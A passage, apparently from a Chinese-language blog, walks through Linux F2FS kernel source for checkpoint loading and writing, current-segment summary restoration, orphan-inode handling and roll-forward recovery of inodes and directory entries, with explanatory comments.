<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// struct f2fs_sb_info在/fs/f2fs/f2fs.h中</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_valid_checkpoint</span><span class="params">(struct f2fs_sb_info *sbi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_checkpoint</span> *<span class="title">cp_block</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * sbi指向f2fs_sb_info结构体的子数据raw_super, 是一个原始超级块指针</span></span><br><span class="line"><span class="comment">     * raw_super指向f2fs_super_block类型的任意结构体</span></span><br><span class="line"><span class="comment">     * 这里相当于fsb就是原来的超级块指针</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_super_block</span> *<span class="title">fsb</span> =</span> sbi-&gt;raw_super;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">cp1</span>, *<span class="title">cp2</span>, *<span class="title">cur_page</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> blk_size = vsbi-&gt;blocksize;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cp1_version = <span class="number">0</span>, cp2_version = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> cp_start_blk_no;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * kzalloc在include/linux/slab.h中</span></span><br><span class="line"><span class="comment">     * blk_size是需要分配的内存大小, GFP_KERNEL为要分配的内存类型</span></span><br><span class="line"><span class="comment">     * 查询&quot;内存分配掩码&quot;知: GFP_KERNEL是一种常规的分配方式，可能会阻塞。</span></span><br><span class="line"><span class="comment">     * 这个标志在睡眠安全时用在进程的长下文代码中。</span></span><br><span class="line"><span class="comment">     * 为了获取调用者所需的内存，内核会尽力而为。这个标志应该是首选标志.</span></span><br><span class="line"><span class="comment">     * ckpt是原始checkpoint指针, 指向f2fs_checkpoint类型的任意结构体</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    sbi-&gt;ckpt = kzalloc(blk_size, GFP_KERNEL); <span class="comment">// 分配f2fs_checkpoint的堆空间</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如上述操作未完成, 说明内存不足</span></span><br><span class="line">    <span class="keyword">if</span> (!sbi-&gt;ckpt)</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 找到并读取两个cp</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    cp_start_blk_no = le64_to_cpu(fsb-&gt;start_segment_checkpoint); <span class="comment">// 从sbi获得checkpoint的起始地址</span></span><br><span class="line">    cp1 = validate_checkpoint(sbi, cp_start_blk_no, &amp;cp1_version); <span class="comment">// 读取该地址并检查其合法性</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The second checkpoint pack should start at the next segment */</span></span><br><span class="line">    cp_start_blk_no += <span class="number">1</span> &lt;&lt; le32_to_cpu(fsb-&gt;log_blocks_per_seg);</span><br><span class="line">    cp2 = validate_checkpoint(sbi, cp_start_blk_no, &amp;cp2_version);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (cp1 &amp;&amp; cp2) &#123; <span class="comment">// 根据版本的高低决定使用哪个版本的cp</span></span><br><span class="line">        <span class="keyword">if</span> (ver_after(cp2_version, cp1_version))</span><br><span class="line">            cur_page = cp2;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            cur_page = cp1;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cp1) &#123;</span><br><span class="line">        cur_page = cp1;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cp2) &#123;</span><br><span class="line">        cur_page = cp2;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">goto</span> fail_no_cp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// page_address返回页面的虚拟地址, 这个cur_page就是以上获取的正在使用的checkpoint</span></span><br><span class="line">    cp_block = (struct f2fs_checkpoint *)page_address(cur_page);</span><br><span class="line">    <span class="built_in">memcpy</span>(sbi-&gt;ckpt, cp_block, blk_size); <span class="comment">// 复制数据到sbi中，用于运行中的管理</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* f2fs_put_page在/fs/f2fs/f2fs.h中</span></span><br><span class="line"><span class="comment">     * 查看!PageLocked(cp1)和!PageLocked(cp1)时的堆栈信息.</span></span><br><span class="line"><span class="comment">     * 解除cp1和cp2的锁定并释放页面缓存</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    f2fs_put_page(cp1, <span class="number">1</span>);</span><br><span class="line">    f2fs_put_page(cp2, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fail_no_cp:</span><br><span class="line">    kfree(sbi-&gt;ckpt);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="build-segment-manager-恢复curseg"><a href="#build-segment-manager-恢复curseg" class="headerlink" title="build_segment_manager // 恢复curseg"></a>build_segment_manager // 恢复curseg</h4><p>恢复curseg的功能主要在<code>build_segment_manager</code>函数的<code>build_curseg</code>函数中完成<br>build_segment_manager和build_curseg<strong>定义</strong>在fs/f2fs/segment.c  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">build_curseg</span><span class="params">(struct f2fs_sb_info *sbi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">curseg_info</span> *<span class="title">array</span>;</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">array</span> = kzalloc(<span class="keyword">sizeof</span>(*<span class="built_in">array</span>) * NR_CURSEG_TYPE, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">array</span>)</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">    SM_I(sbi)-&gt;curseg_array = <span class="built_in">array</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化curseg的空间</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_CURSEG_TYPE; i++) &#123;</span><br><span class="line">        mutex_init(&amp;<span class="built_in">array</span>[i].curseg_mutex);</span><br><span class="line">        <span class="built_in">array</span>[i].sum_blk = kzalloc(PAGE_CACHE_SIZE, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">array</span>[i].sum_blk)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="built_in">array</span>[i].segno = NULL_SEGNO;</span><br><span class="line">        <span class="built_in">array</span>[i].next_blkoff = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从磁盘中，读取恢复curseg的信息</span></span><br><span class="line">    <span class="keyword">return</span> restore_curseg_summaries(sbi);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="restore-curseg-summaries-读取curseg"><a href="#restore-curseg-summaries-读取curseg" class="headerlink" title="restore_curseg_summaries // 读取curseg"></a>restore_curseg_summaries // 读取curseg</h5><p>function in /fs/f2fs/segment.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">restore_curseg_summaries</span><span class="params">(struct f2fs_sb_info *sbi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> type = CURSEG_HOT_DATA;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 检查CP_COMPACT_SUM_FLAG的标志，这个标志用于检查是否按COMPACTED的方式读取data summary</span></span><br><span class="line"><span class="comment">     * is_set_ckpt_flags fs/f2fs/f2fs.h, line 467 (as a function)</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (is_set_ckpt_flags(F2FS_CKPT(sbi), CP_COMPACT_SUM_FLAG)) &#123;</span><br><span class="line">        <span class="comment">/* restore for compacted data summary */</span></span><br><span class="line">        <span class="keyword">if</span> (read_compacted_summaries(sbi))</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        type = CURSEG_HOT_NODE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 如果没有COMPACTED标识，则DATA和NODE都使用NORMAL的方式进行恢复</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span> (; type &lt;= CURSEG_COLD_NODE; type++)</span><br><span class="line">        <span class="keyword">if</span> (read_normal_summaries(sbi, type))</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="read-normal-summaries-读取summaries"><a href="#read-normal-summaries-读取summaries" class="headerlink" title="read_normal_summaries //读取summaries"></a>read_normal_summaries //读取summaries</h6><p>这个函数对于F2FS的正常关闭，重新启动时读取的summary的方式都是类似的，都是根据HOT/WARM/COLD的顺序，读取对应的block，然后将数据保存到curseg对应的类型当中。这里<strong>重点考虑出现了宕机的情况的恢复</strong>。</p>
<hr>
<h2 id="checkpoint-c"><a href="#checkpoint-c" class="headerlink" title="checkpoint.c"></a>checkpoint.c</h2><h3 id="grab-meta-page-和-get-meta-page-获取元页面"><a href="#grab-meta-page-和-get-meta-page-获取元页面" class="headerlink" title="grab_meta_page 和 get_meta_page// 获取元页面"></a>grab_meta_page 和 get_meta_page// 获取元页面</h3><p>不同之处在于，<code>grab_meta_page</code>在返回给定缓存中给定索引处的锁定页面后，调用<code>wait_on_page_writeback</code>等待页面完成回写再<code>SetPageUptodate</code>更新页面，然后返回page<br>而<code>get_meta_page</code>，在返回给定缓存中给定索引处的锁定页面后，调用<code>mark_page_accessed</code>将页面标记为可访问，然后返回page</p>
<hr>
<p>f2fs_write_meta_page f2fs_write_meta_pages sync_meta_pages与写页面相关</p>
<hr>
<h3 id="f2fs-set-meta-page-dirty-设置元页面为脏"><a href="#f2fs-set-meta-page-dirty-设置元页面为脏" class="headerlink" title="f2fs_set_meta_page_dirty // 设置元页面为脏"></a>f2fs_set_meta_page_dirty // 设置元页面为脏</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">f2fs_set_meta_page_dirty</span><span class="params">(struct page *page)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span> =</span> page-&gt;mapping;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_sb_info</span> *<span class="title">sbi</span> =</span> F2FS_SB(mapping-&gt;host-&gt;i_sb);</span><br><span class="line"></span><br><span class="line">    SetPageUptodate(page); <span class="comment">// 更新页面</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 如果该page不是脏页，则调用__set_page_dirty_nobuffers将页面设置为脏，但不是所有缓冲区都设置为脏</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!PageDirty(page)) &#123;</span><br><span class="line">        __set_page_dirty_nobuffers(page);</span><br><span class="line">        inc_page_count(sbi, F2FS_DIRTY_META);</span><br><span class="line">        F2FS_SET_SB_DIRT(sbi);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="check-orphan-space-检查孤立空间大小"><a href="#check-orphan-space-检查孤立空间大小" class="headerlink" title="check_orphan_space // 检查孤立空间大小"></a>check_orphan_space // 检查孤立空间大小</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_orphan_space</span><span class="params">(struct f2fs_sb_info *sbi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> max_orphans;</span><br><span class="line">    <span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 考虑段中的512个块，cp和log段摘要需要5个块</span></span><br><span class="line"><span class="comment">     * 剩余的块用于保留有限的orphan entries，为cp pack保留一个段，我们最多可以有1020 * 507个orphan entries</span></span><br><span class="line"><span class="comment">     * F2FS_ORPHANS_PER_BLOCK用于孤立索引节点的管理(#define F2FS_ORPHANS_PER_BLOCK 1020)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    max_orphans = (sbi-&gt;blocks_per_seg - <span class="number">5</span>) * F2FS_ORPHANS_PER_BLOCK;</span><br><span class="line">    mutex_lock(&amp;sbi-&gt;orphan_inode_mutex); <span class="comment">// 获取互斥量</span></span><br><span class="line">    <span class="keyword">if</span> (sbi-&gt;n_orphans &gt;= max_orphans)</span><br><span class="line">    err = -ENOSPC;</span><br><span class="line">    mutex_unlock(&amp;sbi-&gt;orphan_inode_mutex); <span class="comment">// 释放此前被锁定的互斥量</span></span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="add-orphan-inode"><a href="#add-orphan-inode" class="headerlink" title="add_orphan_inode"></a>add_orphan_inode</h3><h3 id="remove-orphan-inode"><a href="#remove-orphan-inode" class="headerlink" title="remove_orphan_inode"></a>remove_orphan_inode</h3><h3 id="recover-orphan-inode-恢复孤立索引节点"><a href="#recover-orphan-inode-恢复孤立索引节点" class="headerlink" title="recover_orphan_inode // 恢复孤立索引节点"></a>recover_orphan_inode // 恢复孤立索引节点</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">recover_orphan_inode</span><span class="params">(struct f2fs_sb_info *sbi, <span class="keyword">nid_t</span> ino)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> f2fs_iget(sbi-&gt;sb, ino); <span class="comment">// 获取元空间的索引节点</span></span><br><span class="line">    BUG_ON(IS_ERR(inode)); <span class="comment">// 查看 inode指针未指向最后一个page 时的堆栈内容</span></span><br><span class="line">    clear_nlink(inode); <span class="comment">// 直接将索引节点的链接数清零</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 调用iput截断所有数据 */</span></span><br><span class="line">    iput(inode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="recover-orphan-inodes"><a href="#recover-orphan-inodes" class="headerlink" title="recover_orphan_inodes"></a>recover_orphan_inodes</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">recover_orphan_inodes</span><span class="params">(struct f2fs_sb_info *sbi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">block_t</span> start_blk, orphan_blkaddr, i, j;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果umount和journal_present标志值为0则直接return 0</span></span><br><span class="line">    <span class="keyword">if</span> (!(F2FS_CKPT(sbi)-&gt;ckpt_flags &amp; CP_ORPHAN_PRESENT_FLAG))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    sbi-&gt;por_doing = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 获取块起始地址和orphan块地址</span></span><br><span class="line">    start_blk = __start_cp_addr(sbi) + <span class="number">1</span>;</span><br><span class="line">    orphan_blkaddr = __start_sum_addr(sbi) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; orphan_blkaddr; i++) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> get_meta_page(sbi, start_blk + i);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_orphan_block</span> *<span class="title">orphan_blk</span>;</span></span><br><span class="line"></span><br><span class="line">        orphan_blk = (struct f2fs_orphan_block *)page_address(page);</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; le32_to_cpu(orphan_blk-&gt;entry_count); j++) &#123;</span><br><span class="line">            <span class="keyword">nid_t</span> ino = le32_to_cpu(orphan_blk-&gt;ino[j]);</span><br><span class="line">            recover_orphan_inode(sbi, ino);</span><br><span class="line">        &#125;</span><br><span class="line">        f2fs_put_page(page, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* clear Orphan Flag */</span></span><br><span class="line">    F2FS_CKPT(sbi)-&gt;ckpt_flags &amp;= (~CP_ORPHAN_PRESENT_FLAG);</span><br><span class="line">    sbi-&gt;por_doing = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="get-valid-checkpoint-获取有效的checkpoint"><a href="#get-valid-checkpoint-获取有效的checkpoint" class="headerlink" title="get_valid_checkpoint // 获取有效的checkpoint"></a>get_valid_checkpoint // 获取有效的checkpoint</h3><p>在<code>f2fs_fill_super</code>中已介绍</p>
<h3 id="do-checkpoint"><a href="#do-checkpoint" class="headerlink" title="do_checkpoint"></a>do_checkpoint</h3><p>首先刷新所有的NAT/SIT页面，然后根据curseg修改checkpoint的信息和summary的信息。<br><strong>修改checkpoint</strong>：对<code>f2fs_checkpoint</code>的修改主要是把curseg的当前segno，blkoff等写入到<code>f2fs_checkpoint</code>中，以便下次重启时可以根据这些信息，重建curseg。  </p>
<p><strong>summary的回写</strong>：根据需要回写的summary的数目，返回需要写回的block的数目<code>data_sum_blocks</code>，如果data_sum_blocks = 1 或者 2，则表示回写1个或者2个block，则设置CP_COMPACT_SUM_FLAG标志。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">data_sum_blocks = npages_for_summary_flush(sbi);</span><br><span class="line"><span class="keyword">if</span> (data_sum_blocks &lt; <span class="number">3</span>)</span><br><span class="line">    ckpt-&gt;ckpt_flags |= CP_COMPACT_SUM_FLAG;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    ckpt-&gt;ckpt_flags &amp;= (~CP_COMPACT_SUM_FLAG);</span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line">然后调用**write_data_summaries**将summary写入磁盘。  </span><br><span class="line">`write_data_summaries(sbi, start_blk);<span class="comment">//将data summary以及里面的journal写入磁盘`  </span></span><br><span class="line">`write_data_summaries`函数会判断一下是否设置了CP_COMPACT_SUM_FLAG标志，采取不同的方法写入磁盘。  </span><br><span class="line"></span><br><span class="line">### write_checkpoint <span class="comment">// 写checkpoint</span></span><br><span class="line"></span><br><span class="line">```<span class="function">c</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_checkpoint</span><span class="params">(struct f2fs_sb_info *sbi, <span class="keyword">bool</span> blocked, <span class="keyword">bool</span> is_umount)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_checkpoint</span> *<span class="title">ckpt</span> =</span> F2FS_CKPT(sbi);<span class="comment">//从sbi读取当前cp的数据结构</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> ckpt_ver;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!blocked) &#123;</span><br><span class="line">    mutex_lock(&amp;sbi-&gt;cp_mutex);</span><br><span class="line">    block_operations(sbi);<span class="comment">//将文件系统的所有操作停止</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     *按照DATA, NODE, META的顺序将数据从page同步写入到磁盘</span></span><br><span class="line"><span class="comment">     *（META包括了SIT/NAT/checkpoint）</span></span><br><span class="line"><span class="comment">     *这里写入磁盘的meta并不是最新的meta</span></span><br><span class="line"><span class="comment">     *（可能是在此之前使用fsync/fdatasync时触发了checkpoint，meta还没有完全写入磁盘时起到阻塞的作用）</span></span><br><span class="line"><span class="comment">     *最新的meta还只保存在cache中</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    f2fs_submit_bio(sbi, DATA, <span class="literal">true</span>);</span><br><span class="line">    f2fs_submit_bio(sbi, NODE, <span class="literal">true</span>);</span><br><span class="line">    f2fs_submit_bio(sbi, META, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 完成数据的写入后更新更新版本号</span></span><br><span class="line"><span class="comment">     * 以便于SIT entries和seg summaries写入正确的位置</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ckpt_ver = le64_to_cpu(ckpt-&gt;checkpoint_ver);</span><br><span class="line">    ckpt-&gt;checkpoint_ver = cpu_to_le64(++ckpt_ver);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 更新元数据的NAT区域, SIT区域</span></span><br><span class="line"><span class="comment">     * 刷写所有nat entries, sit entries到磁盘</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    flush_nat_entries(sbi);</span><br><span class="line">    flush_sit_entries(sbi);</span><br><span class="line"></span><br><span class="line">    reset_victim_segmap(sbi);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* unlock all the fs_lock[] in do_checkpoint()</span></span><br><span class="line"><span class="comment">     * 调用do_checkpoint()将最新的元数据Checkpoint区域以及Summary区域写入磁盘</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    do_checkpoint(sbi, is_umount);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 恢复文件系统的操作</span></span><br><span class="line">    unblock_operations(sbi);</span><br><span class="line">    mutex_unlock(&amp;sbi-&gt;cp_mutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="recovery-c"><a href="#recovery-c" class="headerlink" title="recovery.c"></a>recovery.c</h2><h3 id="space-for-roll-forward-是否可以前滚回复"><a href="#space-for-roll-forward-是否可以前滚回复" class="headerlink" title="space_for_roll_forward // 是否可以前滚回复"></a>space_for_roll_forward // 是否可以前滚回复</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">space_for_roll_forward</span><span class="params">(struct f2fs_sb_info *sbi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 最后有效块数与分配有效块数之和小于等于用户块数，返回true</span></span><br><span class="line">    <span class="keyword">if</span> (sbi-&gt;last_valid_block_count + sbi-&gt;alloc_valid_block_count</span><br><span class="line">        &gt; sbi-&gt;user_block_count)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="get-fsync-inode-获取fsync索引节点"><a href="#get-fsync-inode-获取fsync索引节点" class="headerlink" title="get_fsync_inode // 获取fsync索引节点"></a>get_fsync_inode // 获取fsync索引节点</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回一个entry(获取fsync索引节点)</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct fsync_inode_entry *<span class="title">get_fsync_inode</span><span class="params">(struct list_head *head,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">nid_t</span> ino)</span> <span class="comment">// typedef u32 nid_t</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">this</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fsync_inode_entry</span> *<span class="title">entry</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历列表，struct list_head做循环游标，head为列表头</span></span><br><span class="line">    list_for_each(<span class="keyword">this</span>, head) &#123;</span><br><span class="line">        <span class="comment">// 获取目录项的结构</span></span><br><span class="line">        entry = list_entry(<span class="keyword">this</span>, struct fsync_inode_entry, <span class="built_in">list</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// entry指向vfs inode指针指向的结构体inode中的子数据i_ino与给定ino(inode number)相等则返回目录项</span></span><br><span class="line">        <span class="keyword">if</span> (entry-&gt;inode-&gt;i_ino == ino)</span><br><span class="line">            <span class="keyword">return</span> entry;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="recover-dentry-恢复目录项"><a href="#recover-dentry-恢复目录项" class="headerlink" title="recover_dentry // 恢复目录项"></a>recover_dentry // 恢复目录项</h3><figure class="highlight plaintext"><figcaption><span>恢复目录项</span></figcaption><table><tr><td class="code"><pre><span class="line">static int recover_dentry(struct page *ipage, struct inode *inode)</span><br><span class="line">&#123;</span><br><span class="line">    // kmap函数将分配到的高端内存映射到永久内存映射区域</span><br><span class="line">    struct f2fs_node *raw_node = (struct f2fs_node *)kmap(ipage);</span><br><span class="line">    struct f2fs_inode *raw_inode = &amp;(raw_node-&gt;i);</span><br><span class="line">    struct dentry dent, parent;</span><br><span class="line">    struct f2fs_dir_entry *de;</span><br><span class="line">    struct page *page;</span><br><span class="line">    struct inode *dir;</span><br><span class="line">    int err = 0;</span><br><span class="line"></span><br><span class="line">    if (!raw_node-&gt;footer.dentry)</span><br><span class="line">        goto out;</span><br><span class="line"></span><br><span class="line">    // 获取inode所属文件的超级块指针和父索引节点号</span><br><span class="line">    dir = f2fs_iget(inode-&gt;i_sb, le32_to_cpu(raw_inode-&gt;i_pino));</span><br><span class="line">    if (IS_ERR(dir)) &#123;</span><br><span class="line">        err = -EINVAL;</span><br><span class="line">        goto out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    parent.d_inode = dir; // 与该目录项关联的inode</span><br><span class="line">    dent.d_parent = &amp;parent; // 父目录的目录项</span><br><span class="line"></span><br><span class="line">    // 目录项名称</span><br><span class="line">    dent.d_name.len = le32_to_cpu(raw_inode-&gt;i_namelen);</span><br><span class="line">    dent.d_name.name = raw_inode-&gt;i_name;</span><br><span class="line"></span><br><span class="line">    // 根据以上信息找到目录项</span><br><span class="line">    de = f2fs_find_entry(dir, &amp;dent.d_name, &amp;page);</span><br><span class="line">    if (de) &#123;</span><br><span class="line">        kunmap(page);</span><br><span class="line">        f2fs_put_page(page, 0);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        f2fs_add_link(&amp;dent, inode);</span><br><span class="line">    &#125;</span><br><span class="line">    iput(dir);</span><br><span class="line">out:</span><br><span class="line">    kunmap(ipage);</span><br><span class="line">    return err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="recover-inode-恢复inode"><a href="#recover-inode-恢复inode" class="headerlink" title="recover_inode // 恢复inode"></a>recover_inode // 恢复inode</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">recover_inode</span><span class="params">(struct inode *inode, struct page *node_page)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 获取节点页面的映射虚拟地址</span></span><br><span class="line">    <span class="keyword">void</span> *kaddr = page_address(node_page);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_node</span> *<span class="title">raw_node</span> =</span> (struct f2fs_node *)kaddr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">f2fs_inode</span> *<span class="title">raw_inode</span> =</span> &amp;(raw_node-&gt;i);</span><br><span class="line"></span><br><span class="line">    inode-&gt;i_mode = le32_to_cpu(raw_inode-&gt;i_mode); <span class="comment">//  文件类型和访问权限</span></span><br><span class="line">    i_size_write(inode, le64_to_cpu(raw_inode-&gt;i_size)); <span class="comment">// inode所代表的文件大小</span></span><br><span class="line">    inode-&gt;i_atime.tv_sec = le32_to_cpu(raw_inode-&gt;i_atime); <span class="comment">// 文件最后一次访问时间</span></span><br><span class="line">    inode-&gt;i_ctime.tv_sec = le32_to_cpu(raw_inode-&gt;i_ctime); <span class="comment">// inode最后一次修改时间</span></span><br><span class="line">    inode-&gt;i_mtime.tv_sec = le32_to_cpu(raw_inode-&gt;i_mtime); <span class="comment">// 文件最后一次修改时间</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> recover_dentry(node_page, inode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

